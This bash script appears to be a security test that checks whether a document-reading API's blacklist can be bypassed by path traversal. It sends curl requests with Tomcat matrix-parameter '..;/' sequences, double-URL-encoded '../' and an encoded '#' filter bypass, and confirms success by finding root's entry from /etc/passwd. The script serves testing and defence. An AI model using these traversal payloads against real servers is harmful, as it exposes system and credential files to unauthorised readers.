#!/usr/bin/env bash
# TRAVERSAL-BYPASS-001 (CWE-22 + CWE-172): the /api/docs blacklist blocks the
# literal "../" and "#" tokens, but Spring/Tomcat-flavour payloads defeat it and
# escape DOCS_BASE to read /etc/passwd:
#   - matrix parameter:   ..;/  (Tomcat strips the ;segment -> ../)
#   - double URL-encoding: %252e%252e%252f  (a second decode -> ../)
#   - the double-encoded hash %2523 slips past the block that a bare %23 (#) trips.
set -eu; . "$(dirname "$0")/_lib.sh"

# (1) matrix-parameter bypass reads /etc/passwd
curl -s "$TARGET/api/docs/read?path=..;/..;/..;/..;/..;/..;/etc/passwd" | grep -q 'root:.*:0:0:'

# (2) double-encoded ../ also reads it
DE="%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
curl -s "$TARGET/api/docs/read?path=$DE" | grep -q 'root:.*:0:0:'

# (3) the # filter: a bare %23 (#) is blocked (403), the double-encoded %2523 is not
blocked=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/docs/read?path=%23readme.txt")
bypass=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/docs/read?path=%2523readme.txt")
[ "$blocked" = "403" ] && [ "$bypass" != "403" ]
